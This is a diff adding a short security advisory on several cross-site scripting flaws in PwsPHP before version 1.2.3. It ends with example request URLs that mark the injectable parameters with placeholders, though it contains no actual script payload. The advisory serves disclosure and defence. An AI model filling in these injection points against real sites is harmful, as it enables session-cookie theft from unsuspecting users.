@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/13561/info
+
+PwsPHP is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+The vendor has addressed these issues in PwsPHP version 1.2.3; earlier versions are reported vulnerable. 
+
+http://www.example.com/index.php?mod=news&ac=plus&month=[XSS INJECTION]&annee=[XSS INJECTION]
+http://www.example.com/index.php?mod=stats&aff=forum&nbractif=[XSS INJECTION]
+http://www.example.com/index.php?mod=stats&aff=pages&annee=[XSS INJECTION]
+http://www.example.com/profil.php?id=1%20[XSS INJECTION]
+http://www.example.com/memberlist.php?mb_lettre=%A4%20[XSS INJECTION]
+http://www.example.com/memberlist.php?mb1_order=id&mb1_ord=DESC&lettre=[XSS INJECTION]
+http://www.example.com/index.php?&mod=recherche&choix_recherche=2&chaine_search=[XSS INJECTION]&multi_mots=tous&choix_forum=1&auteur_search=[XSS INJECTION] 
